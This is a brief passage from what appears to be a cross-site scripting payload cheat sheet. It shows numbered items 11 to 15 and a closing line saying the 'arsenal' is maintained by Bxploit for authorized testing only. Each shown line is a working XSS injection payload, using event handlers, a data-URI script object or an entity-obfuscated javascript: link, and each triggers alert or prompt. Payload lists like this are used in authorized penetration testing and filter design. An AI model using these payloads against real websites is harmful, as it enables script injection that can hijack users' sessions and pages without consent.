11. <input onfocus=alert(1) autofocus>
12. <video src=x onerror=prompt(1)>
13. <body/onload=alert(1)>
14. <object data="data:text/html,<script>alert(1)</script>">
15. <a href=javascript&colon;alert(1)>click</a>
```

---

*Arsenal maintained by Bxploit. Authorized testing only.*
